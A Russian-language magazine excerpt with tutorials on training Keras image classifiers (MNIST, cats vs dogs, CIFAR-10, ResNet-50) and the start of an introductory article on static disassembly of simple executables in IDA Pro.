Все готово. Мы создаем модель, обучаем ее и записываем модель в файл:


model = mnist_cnn_model()
mnist_cnn_train(model)
model.save('cnn_digits_28x28.h5')

Обучение нейронной сети с той же базой MNIST из 60 тысяч изображений
занимает 46 секунд с использованием Nvidia CUDA и около пяти минут
без нее.
   Теперь мы можем использовать нейросеть для распознавания изоб‐
ражений:


def cnn_digits_predict(model, image_file):
   image_size = 28
   img = keras.preprocessing.image.load_img(image_file,
target_size=(image_size, image_size), color_mode='grayscale')
   img_arr = np.expand_dims(img, axis=0)
   img_arr = 1 ‐ img_arr/255.0
   img_arr = img_arr.reshape((1, 28, 28, 1))


   result = model.predict_classes([img_arr])
   return result[0]


model = tf.keras.models.load_model('cnn_digits_28x28.h5')
print(cnn_digits_predict(model, 'digit_0.png'))
print(cnn_digits_predict(model, 'digit_1.png'))
print(cnn_digits_predict(model, 'digit_3.png'))
print(cnn_digits_predict(model, 'digit_8.png'))
print(cnn_digits_predict(model, 'digit_9.png'))

Результат гораздо точнее, что и следова ло ожидать: [0, 1, 3, 8, 9].
  Все готово! Теперь у тебя есть прог рамма, умеющая распознавать цифры.
Благодаря Python работать код будет где угодно — на операци онных сис‐
темах Windows и Linux. При желании можешь запус тить его даже на Raspberry
Pi.
  Ты наверняка хочешь знать, можно ли распознавать буквы аналогичным
способом? Да, придется только увеличить число выходов сети и найти под‐
ходящий набор картинок для обучения.
  Надеюсь, у тебя достаточно информации для экспе риментов. К тому же
с реальным примером перед глазами раз бираться значительно проще!
COVERSTORY
 МАШИННОЕ
  ЗРЕНИЕ
       НА PYTHON

      УЧИМ НЕЙРОСЕТЬ ОТЛИЧАТЬ
       МЕДВЕДЕЙ ОТ СЛОНОВ





Ты наверняка слышал, что нейросети в пос‐
леднее  время  ста ли  чертов ски хорошо
справляться с распознаванием объ ектов
на картинках. Наша же задача — научиться
пользоваться этими нейросетями, ведь их           DmitrySpb79                                                                                                    IoT/Python Developer
мощь может пригодиться в самых разных           dmitryelj@gmail.com
случаях.  В  этой  статье  я  расска жу,
как задействовать ее при помощи самых
распространенных  инструментов:  Python
и библиотек Tensorﬂow и Keras.


             INFO

                   В предыдущей статье я показывал примеры прос‐
                        тейших    нейросетей    и   демонстрировал,
                         как научить нейронку распознавать циф ры. А из
                         статьи «Исходный кот. Как заставить нейронную
                         сеть  ошибиться»  ты  узнаешь,  как  обмануть
                    машинное зрение.



БИНАРНАЯ КЛАССИФИКАЦИЯ
Научим нашу нейросеть распознавать, кошка или собака изображены
на фото. Это классический пример, и к нему в Keras Datasets уже есть необ‐
ходимый для обучения набор картинок. Ина че нам пришлось бы вручную соз‐
дать и классифицировать нес колько тысяч фотографий.
  Подклю чим необ ходимые библиотеки.


from tensorflow import keras
from tensorflow.keras import layers
from tensorflow.keras import Sequential
from tensorflow.keras.layers import Conv2D, MaxPooling2D, Flatten,
Dense, Dropout, Activation, BatchNormalization, AveragePooling2D
from tensorflow.keras.optimizers import SGD, RMSprop, Adam
# pip install tensorflow‐datasets
import tensorflow_datasets as tfds
import tensorflow as tf
import logging
import numpy as np
import time

Создадим модель нейросети.


def dog_cat_model():
  model = Sequential()
  model.add(Conv2D(32, (3, 3), input_shape=(128, 128, 3), activation=
'relu'))
  model.add(MaxPooling2D(pool_size=(2, 2)))
  model.add(Conv2D(32, (3, 3), activation='relu'))
  model.add(MaxPooling2D(pool_size=(2, 2)))
  model.add(Flatten())
  model.add(Dense(units=128, activation='relu'))
  model.add(Dense(units=1, activation='sigmoid'))
  model.compile(optimizer=Adam(),
    loss='binary_crossentropy',
    metrics=['accuracy'])
  return model

У нашей нейронки толь ко один выход, пос кольку результатом ее работы будет
бинарная величина: единица — собака, ноль — кошка.
   Теперь нейросеть следует обучить. В исходном датасете — 25 тысяч изоб‐
ражений. Мы разделим его на две части для обучения и верификации, а каж‐
дое   изображение   обработа ем.   Раз мер   изображения   должен
быть 128 × 128 пикселей, а цвет в диапазоне от нуля до единицы.


def dog_cat_train(model):
  splits = tfds.Split.TRAIN.subsplit(weighted=(80, 10, 10))
  (cat_train, cat_valid, cat_test), info = tfds.load('cats_vs_dogs',
    split=list(splits), with_info=True, as_supervised=True)


  def pre_process_image(image, label):
    image = tf.cast(image, tf.float32)
    image = image/255.0
    image = tf.image.resize(image, (128, 128))
    return image, label


  BATCH_SIZE = 32
  SHUFFLE_BUFFER_SIZE = 1000
  train_batch = cat_train.map(pre_process_image)
    .shuffle(SHUFFLE_BUFFER_SIZE)
    .repeat().batch(BATCH_SIZE)
  validation_batch = cat_valid.map(pre_process_image)
    .repeat().batch(BATCH_SIZE)


  t_start = time.time()
  model.fit(train_batch, steps_per_epoch=4000, epochs=2,
    validation_data=validation_batch,
    validation_steps=10,
    callbacks=None)
  print("Training done, dT:", time.time() ‐ t_start)

Теперь мы запускаем обучение модели и сохраня ем результаты в файл:


model = dog_cat_model()
dog_cat_train(model)
model.save('dogs_cats.h5')

На моем компьютере с видеокартой GeForce 1060 обучение сети заняло при‐
мерно восемь минут.
   Теперь мы можем исполь зовать обученную сеть. Напишем функцию рас‐
познавания изображения.


def dog_cat_predict(model, image_file):
  label_names = ["cat", "dog"]


  img = keras.preprocessing.image.load_img(image_file,
    target_size=(128, 128))
  img_arr = np.expand_dims(img, axis=0) / 255.0
  result = model.predict_classes(img_arr)
  print("Result: %s" % label_names[result[0][0]])





              Попробуем распознать эти изоб ражения


model = tf.keras.models.load_model('dogs_cats.h5')
dog_cat_predict(model, "cat.png")
dog_cat_predict(model, "dog1.png")
dog_cat_predict(model, "dog2.png")





                           Результат

Этот способ можно использовать и для распознавания других изображений,
сложность только в поиске данных для обучения сети.


КЛАССИФИКАЦИЯ
Решение бинарной задачи, которую мы толь ко что рассмотрели, весьма
простое. Но в жизни отличать кошек от собак при помощи компьютера при‐
ходится нечасто, поэто му рассмотрим более реалистичный пример. Будем
определять, что изоб ражено на фото.
  Для обучения этой нейронной сети возь мем датасет CIFAR‐10 — 60 тысяч
изображений, которые разбиты на десять клас сов: самолет, автомобиль, пти‐
ца, кот, олень, собака, лягушка, лошадь, корабль и грузовик. Размер изоб‐
ражений — 32 × 32 пик селя.





                      Да тасет CIFAR‐10

Поддержка этого датасета включена в Keras.
  Порядок действий прежний: создаем модель ней ронной сети, обучаем ее,
проверяем на реальном примере.


def cifar10_model():
  model = Sequential()
  model.add(Conv2D(32, (3, 3), padding='same',
    activation='relu', input_shape=(32, 32, 3)))
  model.add(Conv2D(32, (3, 3), activation='relu'))
  model.add(MaxPooling2D(pool_size=(2, 2)))
  model.add(Dropout(0.25))
  model.add(Conv2D(64, (3, 3), padding='same', activation='relu'))
  model.add(Conv2D(64, (3, 3), activation='relu'))
  model.add(MaxPooling2D(pool_size=(2, 2)))
  model.add(Dropout(0.25))
  model.add(Flatten())
  model.add(Dense(512, activation='relu'))
  model.add(Dropout(0.5))
  model.add(Dense(10, activation='softmax'))
  model.compile(loss='categorical_crossentropy',
    optimizer=SGD(lr=.1, momentum=0.9, nesterov=True),
    metrics=['accuracy'])
  return model

Код для обучения сети из примера к Keras:


def cifar10_train(model):
  (x_train, y_train), (x_test, y_test) = keras.datasets.cifar10.
load_data()
  y_train = keras.utils.to_categorical(y_train, 10)
  y_test = keras.utils.to_categorical(y_test, 10)
  x_train = x_train.astype('float32')
  x_test = x_test.astype('float32')
  x_train /= 255.0
  x_test /= 255.0


  def scheduler(epoch):
    if epoch < 30:
      return 0.01
    if epoch < 50:
      return 0.001
    return 0.0001


  change_lr = keras.callbacks.LearningRateScheduler(scheduler)


  t_start = time.time()


  # randomly rotate images in the range (degrees, 0 to 180)
  datagen = keras.preprocessing.image.ImageDataGenerator(rotati
on_range=0,
    # randomly shift images horizontally (fraction of total width)
    width_shift_range=0.1,
    # randomly shift images vertically (fraction of total height)
    height_shift_range=0.1,
    # randomly flip images
    horizontal_flip=True,
    # randomly flip images
    vertical_flip=False)


  # Compute quantities required for feature‐wise normalization
  # (std, mean, and principal components if ZCA whitening is applied)
.
  datagen.fit(x_train)


  # Fit the model on the batches generated by datagen.flow().
  model.fit_generator(datagen.flow(x_train, y_train, batch_size=128),
    epochs=60, callbacks=[change_lr],
    validation_data=(x_test, y_test))
  print("Training done, dT:", time.time() ‐ t_start)

Мы используем функцию scheduler, которая позволя ет нам изменять
параметр Learning Rate, отвечающий за скорость обучения. На последних
итерациях, когда разница в точности между отдель ными шагами уже не так
велика,  алгоритм  обучения  работа ет медленнее и  внимательнее,  что
повышает точность результата.
  И мы применяем класс ImageDataGenerator. С его помощью можно уве‐
личить количество изоб ражений для обучения, используя случайные сдвиг,
поворот и отражение по горизонтали уже существу ющих картинок. То есть
из каждого изображения можно создать дополнительные, что повышает
качество обучения сети.
  Запускаем обучение:


model = cifar10_model()
cifar10_train(model)
model.save('cifar10_32x32.h5')

Обучение занимает примерно пятнадцать минут с использованием GPU и до
часа без него.
  Функция распознавания:


def cifar10_predict(model, image_file):
  labels = ["airplane", "automobile", "bird", "cat",
    "deer", "dog", "frog", "horse", "ship", "truck"]


  img = keras.preprocessing.image.load_img(image_file, target_size=(
32, 32))
  img_arr = np.expand_dims(img, axis=0) / 255.0
  result = model.predict_classes(img_arr)
  print("Result: {}".format(labels[result[0]]))





                  Изоб ражения для тестирова ния





                 Результаты работы нейронной сети

Эту нейросеть можно использовать для практических задач: например,
выделять из видеопотока только те изоб ражения, на которых есть авто‐
мобиль.


СЕТЬ RESNET-50
Мы подошли к пределу воз можнос тей домашнего ПК для обучения нейрон‐
ных сетей. Пре дыдущая нейросеть обра батывает изображения раз мером
всего лишь 32 × 32, но при этом ее обучение длится около пятнадцати минут
на компьютере с процессором Core i7 и видеокартой GeForce 1060.
  При такой скорости рас четов подбор или изменение параметров сети
займут немало времени.
  Поэтому попробуем использовать уже готовые, предобу ченные сети.
Для примера рассмотрим нейронную ResNet‐50. Она имеет сложную тополо‐
гию и состоит из 50 слоев. Кста ти, она заняла первое мес то на конкурсе
ILSVRC 2015. ResNet‐50 поз воля ет рас позна вать изображения по тысяче
категорий, а размер изображений, которые она использует, составляет 224 ×
224.
  Наш код станет намного проще: нам не нужно ни создавать модель,
ни обучать ее. Мы сразу можем перейти к распознаванию.


def predict_resnet50(model, image_file):
  img = tf.contrib.keras.preprocessing.image.load_img(image_file,
    target_size=(224, 224))
  img_data = tf.contrib.keras.preprocessing.image.img_to_array(img)
  x = tf.contrib.keras.applications.resnet50.preprocess_input(
    np.expand_dims(img_data, axis=0))
  probabilities = model.predict(x)
  print(tf.contrib.keras.applications.resnet50.decode_predictions(
probabilities, top=5))


model = tf.keras.applications.ResNet50(input_shape=(224, 224, 3))
predict_resnet50(model, "cat.png")
predict_resnet50(model, "dog.png")
predict_resnet50(model, "elephant.jpg")
predict_resnet50(model, "bear.png")
predict_resnet50(model, "car.png")





                  Изоб ражения для тестирова ния





                   Результаты работы ResNet‐50

Сеть узнала полосатого кота, мопса, слона, медведя и спортивный авто‐
мобиль. Для каждого изоб ражения она выб рала пять наиболее подходящих
результатов.
  Работает сеть полностью автономно. Так что, если тебе нужна автономная
сигнализация, которая будет срабатывать при виде медведя или слона,
теперь ты знаешь, как ее сделать.
ВЗЛОМ

ФУНДАМЕНТАЛЬНЫЕ
ОСНОВЫ
ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

МАСТЕР‐КЛАСС
ПО АНАЛИЗУ
ИСПОЛНЯЕМЫХ
                                                            Юрий Язев
                                                                      Широко известен подФАЙЛОВ В IDA PRO                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





В этой статье мы окунемся в глубокий и подробный ста‐
тический анализ с помощью IDA Pro — сверхпопулярного
среди  хакеров  и  специалистов  по  информацион ной
безопасности дизассемблера. С первых же версий он занял
заслуженное место лидера рынка. Это своего рода швей‐
царский армейский нож, которым мы будем разделывать
цифровую добычу. Начнем с самого базового анализа и пос‐
тепенно будем про бираться вперед, раз гребая заросли
кода.


С легкой руки Денниса Ритчи повелось начинать освоение нового язы ка
программирования с соз дания прос тейшей  прог раммы  «Hello,  World!».
Не будем нарушать эту традицию и оценим возможности IDA Pro сле дующим
примером.


             INFO

                       Чтобы все было как в статье, компилируй при‐
                    меры с помощью Visual C++ 2017 вызовом cl.
                   exe first.cpp /EHcs. Флаг /EHcs нужен,
                         что бы подавить возражение компилято ра и вмес‐
                         те с тем включить семан тику уничтожения объ‐
                          ектов.



#include <iostream>
void main()
{
  std::cout << "Hello, Sailor!\n";
}

Компилятор сгенерирует исполняемый файл объемом почти 190 Кбайт, боль‐
шую часть которого займет служеб ный, стартовый или библиотечный код.
Попытка дизассемблирования с помощью таких средств, как W32Dasm,
не увенчается быстрым успехом, поскольку над полученным лис тингом раз‐
мером в два с половиной мегабайта (!) можно просидеть не час и не два. Лег‐
ко представить, сколько времени уйдет на серьезные задачи, тре бующие изу‐
чения десятков и сотен мегабайтов дизассемблированного текста.
  Попробуем дизассемблировать эту программу с помощью IDA. Если все
настройки оставить по умолчанию, то пос ле завершения анализа экран дол‐
жен выглядеть следующим образом.





                     Результат работы IDA Pro

Чтобы открыть текстовое представление, надо из контекстного меню выбрать
пункт Text view.


              IDA ProКакую вер сию      выб рать?
Последней версией IDA Pro на момент написания статьи была 7.3. Ее цена
может быть великовата для покупки в исследователь ских целях. Как известно,
Ильфак Гильфанов очень строго относится к утечкам и появлению продуктов
своей компании в интернете и не допускает подобного.
  Однако на сайте компании Hex‐Rays в пуб личный доступ выложе на бес‐
платная версия дизассемблера с функциональными ограниче ниями. Нап‐
ример, она не получает обновления пос ле дос тижения майлстоуна целой
версии, то есть сейчас для свободной заг рузки дос тупна версия 7.0. Также
она поддерживает только архитектуры x86 и x64.
  Тем не менее этого вполне дос таточно для наших целей. Потому что нам
не придется разбираться в коде для процессоров ARM, Motorola, Sparc, MIPS
или Zilog. Еще одно огра ничение накладывается на использование в ком‐
мерческих целях, но и тут наша совесть чиста.


Закончив автоматический ана лиз файла first.exe, IDA переместит курсор
к строке .text:0040628B — точке входа в программу. Не забудь из гра‐
фического режима отоб ражения лис тинга переключиться в текстовый. Также
обрати внимание на строчку .text:00406290 start endp ; sp‐analysis
failed, выделенную красным цветом в конце функции start. Так IDA отме‐
чает последнюю строку функции в случае, если у нее в конце return и зна‐
чение указате ля стека на выходе из функции отличает ся от такового на входе.
  Среди начинающих прог раммистов широко рас пространено заблуждение,
что якобы программы, написанные на язы ке С, начинают выпол няться с фун‐
кции main. В действительнос ти это не совсем так. На самом деле сразу пос ле
загрузки файла управление передается на функцию Start, вставленную ком‐
пилятором. Она подготавлива ет гло бальные переменные:
 • argc — количество аргу ментов командной строки;
 • argv — массив указателей на стро ки аргументов;
 • _environ — массив указателей на строки переменных окружения.

Запол няется структура OSVERSIONINFOEX, которая среди прочего включает:
 • dwBuildNumber — билд;
 • dwMajorVersion — старшую версию операционной системы;
 • dwMinorVersion — младшую версию операционной системы;
 • _winver — пол ную версию операционной системы;
 • wServicePackMajor — старшую версию пакета обновления;
 • wServicePackMinor — младшую версию пакета обновления.

Далее Start инициализирует кучу (heap) и вызыва ет функцию main, а после
возвращения управле ния завершает процесс с помощью функции Exit.
Для получения значений структуры OSVERSIONINFOEX используется функция
GetVersionEx.
  Продемонстрировать инициализацию переменных, совершаемую стар‐
товым кодом, а также получение их значений поз воляет следующая прог‐
рамма.


CRtO.demo.c
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>


void main()
{
  OSVERSIONINFOEX osvi;
  ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
  osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
  GetVersionEx((OSVERSIONINFO*)&osvi);


  int a;
  printf(">OS Version:\t\t\t%d.%d\n\
  >Build:\t\t\t%d\n\
  >Arguments count:\t%d\n", \
    osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwOSVersionInfo
Size, __argc);
  for (a = 0; a < __argc; a++)
    printf(">\t Argument %02d:\t\t%s\n", a + 1, __argv[a]);
  a = !a ‐ 1;
  while (_environ[++a]);
    printf(">Environment variables count:%d\n", a);
  while (a)
    printf(">\tVariable %d:\t\t%s\n", a, _environ[‐‐a]);
}

Прототип функции main как будто ука зывает, что приложение не принимает
никаких аргументов командной строки, но результат работы программы
говорит об обратном и на моей машине выглядит так (приводится в сок‐
ращенном виде):



  OS Version:                  6.2
  Build:                       156
  Arguments count:             1
  Argument 01:                 CRt0.demo.exe
  Environment variables count: 99
  ...
  Variable 20: FrameworkVersion=v4.0.30319
  Variable 19: FrameworkDIR32=C:\WINDOWS\Microsoft.NET\Framework\
  Variable 18: FrameworkDir=C:\WINDOWS\Microsoft.NET\Framework\
  Variable 17: Framework40Version=v4.0
  Variable 16: ExtensionSdkDir=C:\Program Files (x86)\Microsoft SDKs\Win‐
  dows Kits\10\ExtensionSDKs
  Variable 15: DriverData=C:\Windows\System32\Drivers\DriverData


Очевидно, нет никакой необходимости ана лизи ровать стандартный стар‐
товый код приложения, и первая задача исследователя — найти мес то
передачи управления на функцию main. К сожалению, чтобы гарантированно
решить эту задачу, потребу ется полный ана лиз содержимого функции Start.
У исследователей есть много хит ростей, которые поз воляют не делать этого,
но все они базируются на особенностях реализации конкретных компилято‐
ров и не могут считаться универсальными.
  Например, Visual C++ всегда, независимо от прототипа функции main,
передает ей три аргумента: ука затель на мас сив указателей переменных
окружения, указатель на массив ука зателей аргу ментов командной строки
и количество аргументов командной строки, а все остальные функции стар‐
тового кода принимают меньшее количество аргументов.
  Рекомендую ознакомить ся с исходниками стартовых функций популярных
компиляторов. Для Visual C++ 14 в соответствии с архи тектурой они находят‐
ся в подпапках катало га %\Program Files (x86)\Microsoft Visual Stu‐
dio  14.0\VC\crt\src\. Их изу чение упростит ана лиз дизассемблерного
листинга.
  Ниже в качестве иллюстрации при водится фрагмент стартового кода
программы first.exe, полученный в результате работы W32Dasm.



  //******************** Program Entry Point ********************
  :0040628B E802070000              call 00406992
  :00406290 E974FEFFFF              jmp 00406109


  * Referenced by a CALL at Addresses:
  |:0040380C   , :004038B2   , :0040392E   , :00403977   , :00403A8E
  |:00404094   , :004040FA   , :00404262   , :00404BF4   , :00405937
  |:004059AE
  |


  * Referenced by a (U)nconditional or (C)onditional Jump at Address:
  |:004062B6(U)
  |
  :00406295 8B4DF4                  mov ecx, dword ptr [ebp‐0C]
  :00406298 64890D00000000          mov dword ptr fs:[00000000], ecx
  :0040629F 59                      pop ecx
  :004062A0 5F                      pop edi
  :004062A1 5F                      pop edi
  :004062A2 5E                      pop esi
  :004062A3 5B                      pop ebx
  :004062A4 8BE5                    mov esp, ebp
  :004062A6 5D                      pop ebp
  :004062A7 51                      push ecx
  :004062A8 F2                      repnz
  :004062A9 C3                      ret
  ...


Иначе выглядит результат работы IDA, умеющей распознавать библиотечные
функции по их сигнатурам (приблизительно по такому же алгоритму работает
множество антивирусов).
  Поэтому способ ности дизассемблера тесно свя заны с его версией и пол‐
нотой комплекта поставки — далеко не все версии IDA Pro в сос тоянии
работать с программами, сгенерированными современными компиляторами.



  .text:0040628B start           proc near
  .text:0040628B
  .text:0040628B ; FUNCTION CHUNK AT .text:00406109 SIZE 00000127 BYTES
  .text:0040628B ; FUNCTION CHUNK AT .text:00406265 SIZE 00000026 BYTES
  .text:0040628B
  .text:0040628B                 call    sub_406992
  .text:00406290                 jmp     loc_406109
  .text:00406290 start           endp ; sp‐analysis failed
  .text:00406290
  .text:00406295 ; [00000015 BYTES: COLLAPSED FUNCTION __EH_epilog3. PRESS
  CTRL‐NUMPAD+ TO EXPAND]
  .text:004062AA ; [00000011 BYTES: COLLAPSED FUNCTION __EH_epilog3_GS.
  PRESS CTRL‐NUMPAD+ TO EXPAND]
  .text:004062BB ; [00000034 BYTES: COLLAPSED FUNCTION __EH_prolog3. PRESS
  CTRL‐NUMPAD+ TO EXPAND]
  .text:004062EF ; [00000037 BYTES: COLLAPSED FUNCTION __EH_prolog3_GS.
  PRESS CTRL‐NUMPAD+ TO EXPAND]
  .text:00406326 ; [00000037 BYTES: COLLAPSED FUNCTION __EH_prolog3_catch.
  PRESS CTRL‐NUMPAD+ TO EXPAND]
  .text:0040635D
  .text:0040635D ; =============== S U B R O U T I N E ===============
  .text:0040635D
  .text:0040635D ; Attributes: thunk
  .text:0040635D
  .text:0040635D sub_40635D      proc near               ; CODE XREF: sub‐
  _4042FD+19↑p
  .text:0040635D                 jmp     sub_406745
  .text:0040635D sub_40635D      endp
  .text:0040635D
  .text:00406362
  ...


Перечень поддерживаемых компилято ров можно найти в файле %IDA%/SIG/
list. В нем есть старинные Microsoft C и Quick C, Visual C++ с первой
по восьмую версию и  Visual.Net. А вот  Visual C++ 14 из  Visual Studio
2017 здесь нет. Однако, взглянув в окно IDA, мы видим, что дизассемблер
сумел определить многие (но не все) функции.
   Заглянем в окно вывода, находя щееся внизу. Там, немного прокрутив
вывод, мы обнаружим строчку Using FLIRT signature: SEH for vc7‐14,
говорящую о том, что используемая вер сия IDA все же понимает компилято‐
ры Visual C++ от 7 до 14.





              Тек стовое отоб ражение результата работы IDA

Давай разбираться в получившемся листинге. Первое и в данном слу чае
единственное, что нам надо найти, — это функция main. В начале стартового
кода после выполнения процедуры sub_406992 прог рамма совершает пры‐
жок на метку loc_406109:



  .text:0040628B start           proc near
  .text:0040628B                 call    sub_406992
  .text:00406290                 jmp     loc_406109


Для перехода на метку дос таточно поставить на нее текстовый курсор
и нажать Enter. Если подвести курсор мыши к метке или вызову функции,
появится  окно, в котором будет показа но начало выбранной функции
или место листинга, куда перево дит метка, что очень удобно.
  В данном случае, как мы видим по коммента рию, IDA отправила нас
в начало стартового куска кода. Немного прокрутим листинг вниз, обращая
внимание на плавные перехо ды по меткам.
  В итоге доходим до вызова функции: call sub_4010D0. Похоже, это и есть
функция main, поскольку здесь дизас семблер смог распознать строковую
переменную и дал ей осмыслен ное имя aHelloSailor, а в комментарии, рас‐
положенном справа, для наглядности при вел оригинальное содержимое
Hello, Sailor!\n. Смещение этой строки компилятор закинул на вершину
стека, а затем ниже через строчку, по всей видимости, происходит вызов
функции вывода на экран:



  .text:004010D3         push    offset aHelloSailor ; "Hello, Sailor!\n"
  .text:004010D8         push    offset unk_42DE30
  .text:004010DD         call    sub_401170


Чтобы убедиться в этом, зайдем в пос леднюю процедуру. Разобраться в ней
без пива не представляется возможным, раз ве что огромное количество
параметров намекает нам на схожесть с функцией printf.
   Если поместить курсор в границы имени aHelloSailor и нажать Enter, IDA
автоматически перейдет  к строке, в которой выполняется определение
переменной:



  .rdata:0041E1A0 aHelloSailor    db 'Hello, Sailor!',0Ah,0 ; DATA XREF:
  sub_4010D0+3↑o


Выражение DATA XREF: sub_4010D0+3↑o называ ется перекрестной ссыл кой
и свидетельствует о том, что в треть ей стро ке процеду ры sub_4010D0 про‐
изошло обращение к текущему адресу по его смещению (o от слова oﬀset),
а стрелка, направлен ная вверх, указывает на относительное рас положение
источника перекрестной ссылки.
   Если навести курсор на выражение sub_4010D0+3↑o и нажать Enter, то IDA
Pro перейдет к следующей строке:



  .text:004010D3         push    offset aHelloSailor ; "Hello, Sailor!\n"


Нажатие  Esc  отменяет  предыдущее  перемещение,  воз вращая  курсор
в исходную позицию.
  К слову, дизассемблер W32Dasm даже не смог распознать строковую
переменную.


            IDA?Что не так с
Положа руку на сердце — я был слегка разочарован, ибо ожи дал, что IDA рас‐
познает больше библиотечных процедур. Поэтому я решил натравить «Иду»
на такую же программу, но сгенерированную более ранней версией ком‐
пилятора. Подопытным кроликом выступил Visual C++ 8.0 (VS 2005).
  Сравним результаты работы компиляторов. Тот же исходник, компиляция
из командной строки (папка first05). Загрузим итоговый экзешник в «Иду».
Листинг приводится в сокращенном виде для экономии пространства.





Мало того что стар товый код меньше по объему, так еще было автоматичес ки
определено большее количес тво биб лиотечных функций, среди которых:
GetVersionExA, GetProcessHeap, HeapFree и ряд других. Сре ди них достаточно
просто найти вызов main и перейти на саму функцию.





Тем не менее VC++ 8.0 — ушедшая эпо ха, и в пример я ее привел только
для ознакомления.


На этом анализ приложения first.cpp можно  считать завершенным.
Для полноты кар тины оста ется переименовать функцию sub_4010D0 в main.
Для этого подводи курсор к строке .text:004010D0 (началу функции) и жми
N. В появившемся диалоге можешь ввес ти main. Результат дол жен выглядеть
так:



  .text:004010D0 ; int __cdecl main(int argc, const char **argv, const
  char **envp)
  .text:004010D0 main    proc near ; CODE XREF: start‐8D↓p
  .text:004010D0
  .text:004010D0 argc    = dword ptr  8
  .text:004010D0 argv    = dword ptr  0Ch
  .text:004010D0 envp    = dword ptr  10h
  .text:004010D0
  .text:004010D0         push    ebp
  .text:004010D1         mov     ebp, esp
  .text:004010D3         push    offset aHelloSailor ; "Hello, Sailor!\n"
  .text:004010D8         push    offset unk_42DE30
  .text:004010DD         call    sub_401170
  .text:004010E2         add     esp, 8
  .text:004010E5         xor     eax, eax
  .text:004010E7         pop     ebp
  .text:004010E8         retn
  .text:004010E8 main    endp


Обрати внимание: IDA в комментарии подста вила прототип функции, а ниже
параметры по умол чанию.


IDA И ЗАШИФРОВАННЫЕ ПРОГРАММЫ
Другое важное преиму щество  IDA — способность  дизассемблировать
зашифрованные программы. В примере Crypt00.com используется ста‐
тическое шифрование, которое час то встречает ся в «конвертных» защитах.
Между тем этот файл не запус тится в Windows 10, пос кольку *.com для работы
требует 16‐разрядную исполняемую среду.
  Я думаю, это не повод отка заться от анализа столь инте ресного примера,
тем более что существуют мощ ные средс тва виртуализации, поэтому пос‐
тавить 32‐битную Windows  XP, которая выполняет 16‐битные проги, —
не проблема. К тому же анализ файлов .com зна чительно проще, чем .exe, так
как первые сильно короче вто рых.
  Мы уже видели непроходимые зарос ли биб лиотечного кода, вставленного
компилятором  в  минимальной  exe‐программе,  тогда  как  в com  все
по минимуму, в чем мы скоро убедимся. Отмечу также, что последней вер‐
сией IDA Pro, работающей в 32‐разрядных средах, была 6.8.





                              Sourcer в деле

Рассматриваемый прием шифрования полностью «ослепляет» большинство
дизассемблеров.  Например,  результат  обработки фай ла  Crypt00.com
при помощи Sourcer выглядит так:



  crypt00   proc  far
  3A6A:0100     start:
  3A6A:0100 ъBE 010D    mov si,10Dh     ; (3A6A:010D=0C3h)
  3A6A:0103     loc_1:        ;  xref 3A6A:010B
  3A6A:0103 80 34 77   xor byte ptr [si],77h ; 'w'
  3A6A:0106 46     inc si
  3A6A:0107 81 FE 0124   cmp si,124h
  3A6A:010B  76 F6    jbe loc_1     ; Jump if below or =
  3A6A:010D  C3     retn
  3A6A:010E  7E CD 62 76 BA 56  db   7Eh,0CDh, 62h, 76h,0BAh, 56h
  3A6A:0114  B4 3F 12 1B 1B 18  db  0B4h, 3Fh, 12h, 1Bh, 1Bh, 18h
  3A6A:011A  5B 57 20 18 05 13  db   5Bh, 57h, 20h, 18h, 05h, 13h
  3A6A:0120 56 7A 7D 53    db   56h, 7Ah, 7Dh, 53h
  crypt00   endp


Самостоятельно Sourcer не сумел дизас семблировать полови ну кода, оста‐
вив ее в виде дампа. С дру гой стороны, как‐то помочь ему мы не можем. Нап‐
ротив, IDA изначально проектировалась как дружественная к пользователю
интерактивная среда. В отличие от Sourcer‐подоб ных дизас семблеров, IDA
не делает никаких молчаливых предположений и при возникновении зат‐
руднений обращается за помощью к человеку. Результат анализа «Идой»
файла Crypt00.com выглядит так:



  seg000:0100        public start
  seg000:0100 start  proc near
  seg000:0100        mov     si, 10Dh
  seg000:0103
  seg000:0103 loc_10103:     ; CODE XREF: start+B↓j
  seg000:0103        xor     byte ptr [si], 77h
  seg000:0106        inc     si
  seg000:0107        cmp     si, 124h
  seg000:010B        jbe     short loc_10103
  seg000:010D        retn
  seg000:010D start  endp
  seg000:010D
  seg000:010D ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  seg000:010E        db 7Eh, 0CDh, 62h, 76h, 0BAh, 56h, 0B4h, 3Fh, 12h, 2
  dup(1Bh)
  seg000:010E        db 18h, 5Bh, 57h, 20h, 18h, 5, 13h, 56h, 7Ah, 7Dh,
  53h
  seg000:010E seg000 ends
  seg000:010E
  seg000:010E
  seg000:010E        end start


И тут необходимо помочь дизас семблеру. Начина ющие пользователи в этой
ситуации обычно ставят курсор на соответс твующую строку и нажимают кла‐
вишу C, заставляя IDA дизас семблировать код с текущей позиции до конца
функции. Несмотря на кажущуюся очевидность, такое решение ошибочно.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
          МАСТЕР‐КЛАСС ПО АНАЛИЗУ ИСПОЛНЯЕМЫХ
                          ФАЙЛОВ В IDA PRO





Дан ные
Что представляет собой число 10Dh в строке 0x100 — константу или сме‐
щение? Очевидно, в регистр SI заносится смещение, потому что впос ледс‐
твии операнд по этому смещению в памяти интерпретируется как байт и над
ним выполняется операция XOR.
   Чтобы преобразовать константу в смещение, установи текстовый курсор
на 10Dh и нажми O. Дизас семблируемый текст станет выглядеть так:



  seg000:0100        mov    si, offset locret_1010D
  ...
  seg000:010D locret_1010D: ; DATA XREF: start+B↑o
  seg000:010D        retn
  seg000:010D start  endp
  seg000:010D
